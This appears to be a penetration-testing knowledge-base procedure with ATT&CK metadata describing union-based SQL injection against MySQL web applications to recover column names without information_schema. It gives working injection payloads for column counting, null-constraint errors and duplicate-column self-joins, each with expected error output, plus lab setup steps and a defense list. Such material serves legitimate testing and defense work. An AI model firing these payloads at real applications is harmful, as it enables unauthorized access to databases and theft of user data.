---
id: 6a57d8a3-1cfd-4583-8de0-c682f389480f
name: MySQL-Union-Based-Injection-to-Extract-Column-Names
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:34.401446+00:00'
updated_at: '2023-04-10T20:22:52.403695+00:00'
tactics:
  - '[[tactics/Discovery|TA0007 - Discovery]]'
  - '[[tactics/Collection|TA0009 - Collection]]'
techniques:
  - >-
    [[techniques/Exploitation-of-Remote-Services|T1190 - Exploitation of Remote
    Services]]
sub_techniques: []
tags:
  - '[[tags/MySQL-Injection]]'
  - '[[tags/Union-Based-SQL-Injection]]'
  - '[[tags/Database-Structure-Discovery]]'
  - '[[tags/Extract-Column-Names-Without-Information-Schema]]'
commands:
  - '[[commands/apt-install-mysql-server]]'
  - '[[commands/mysql-version-check]]'
  - '[[commands/mysql-sql-version-query]]'
platforms:
  - Web
  - Linux
tools: []
validated: true
---

# MySQL-Union-Based-Injection-to-Extract-Column-Names

## Summary

This procedure demonstrates how to perform a union-based SQL injection attack on a MySQL-backed web application to extract column names from a target table without querying the information_schema database. By crafting UNION SELECT statements that trigger specific MySQL errors (such as duplicate column names or null constraints), attackers can infer the database schema, enabling further exploitation like data extraction or privilege escalation.

## Description

Union-based SQL injection exploits vulnerable input parameters in web applications to append malicious UNION SELECT queries to the original SQL statement. In MySQL environments, when direct access to information_schema is restricted or blocked, attackers can use error-based techniques within the UNION to reveal column names. For example, self-joining tables to cause duplicate column errors or forcing null values to trigger constraint violations exposes column identifiers through error messages. This procedure targets numeric or string-based injection points (e.g., ?id=1) in GET/POST requests. It assumes a vulnerable endpoint like a search or ID lookup page connected to a MySQL database. Success reveals the table structure, allowing targeted follow-on attacks such as dumping sensitive data from identified columns (e.g., users, passwords). The technique works on MySQL versions 4.1 and later, where error reporting is enabled.

## Requirements

1. Access to a vulnerable web application endpoint accepting user input (e.g., GET parameter like ?id=1) that is not sanitized for SQL injection.
2. Knowledge of the database type (MySQL confirmed via error messages or prior reconnaissance).
3. A proxy tool like Burp Suite or direct manipulation via browser developer tools/curl to intercept and modify requests.
4. For testing/lab setup: A local MySQL instance (version 5.7+ recommended) to replicate the vulnerability.
5. Basic understanding of SQL syntax and HTTP request manipulation.

## Defense

- Implement prepared statements and parameterized queries in application code to prevent injection.
- Use a Web Application Firewall (WAF) to detect and block UNION SELECT patterns or anomalous SQL payloads.
- Disable detailed MySQL error reporting in production (set log_error_verbosity to minimal) to avoid leaking schema information.
- Enforce least privilege on database accounts, restricting access to information_schema and limiting query capabilities.
- Regularly scan for vulnerabilities using tools like SQLMap or OWASP ZAP.

## Objectives

1. Confirm MySQL as the backend database and determine the number of columns in the vulnerable query.
2. Extract column names from a target table (e.g., users) using error-based UNION injections.
3. Identify potential sensitive columns for further data exfiltration.
4. Validate the injection point and prepare for advanced exploitation.

## Instructions

### Step 1: Set Up Test Environment (Optional for Lab Replication)

**Context**: If testing in a controlled environment, install and verify a local MySQL server to simulate the target. This ensures payloads work as expected before live testing.

**Command** ([[commands/apt-install-mysql-server]]):
```bash
sudo apt-get install mysql-server-5.7
```

> This installs MySQL 5.7 on Debian-based systems like Kali Linux. After installation, secure the installation with `sudo mysql_secure_installation` and start the service with `sudo systemctl start mysql`.

**Command** ([[commands/mysql-version-check]]):
```bash
mysql --version
```

> Expected output: `mysql  Ver 14.14 Distrib 5.7.XX, for Linux (x86_64)`. This confirms the client version; use the SQL query in the next step for server version.

**Command** ([[commands/mysql-sql-version-query]]):
```sql
SELECT VERSION();
```

> Run this in the MySQL console (`mysql -u root -p`). Expected output: `5.7.XX`. Ensures compatibility (MySQL >=4.1 supports the required error behaviors).

### Step 2: Identify Vulnerable Parameter and Column Count

**Context**: Locate the injection point (e.g., ?id=1) and determine the number of columns in the original SELECT query by testing UNION SELECT with incremental nulls or numbers until no error occurs.

**Code** ([[codes/MySQL-Union-Injection-Column-Count-Test]]):
```sql
?id=1 AND (SELECT * FROM db.users)=(SELECT 1)
```

> Submit via GET/POST (e.g., using Burp Repeater). Expected output: Error like "Operand should contain 1 column(s)" – increment the right side (SELECT 1,2, etc.) until it matches the original query's column count (e.g., 4 columns). This step confirms union compatibility without revealing names yet.

### Step 3: Extract Column Names via Null Constraint Errors

**Context**: Once column count is known (e.g., 4), craft a UNION that forces a null in a non-nullable column to trigger an error revealing the column name.

**Code** ([[codes/MySQL-Union-Injection-Null-Column-Test]]):
```sql
?id=1 AND (1,2,3,4)=(SELECT * FROM db.users UNION SELECT 1,2,3,NULL LIMIT 1)
```

> Replace NULL positionally (try in each column slot). Expected output: Error like "Column 'username' cannot be null" – the quoted name is the target column. Repeat for each position to map all columns.

### Step 4: Extract Column Names via Duplicate Errors

**Context**: Use self-joins in the UNION to create duplicate columns, causing MySQL to error with the conflicting name, revealing it without info_schema.

**Code** ([[codes/MySQL-Union-Injection-Duplicate-Column-Exploit]]):
```sql
-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id)) a
```

> Submit as payload. Expected output: Error like "#1060 - Duplicate column name 'name'". Add more USING clauses (e.g., USING(id,name)) iteratively until no error, revealing columns one by one. The 'a' alias avoids subquery issues.
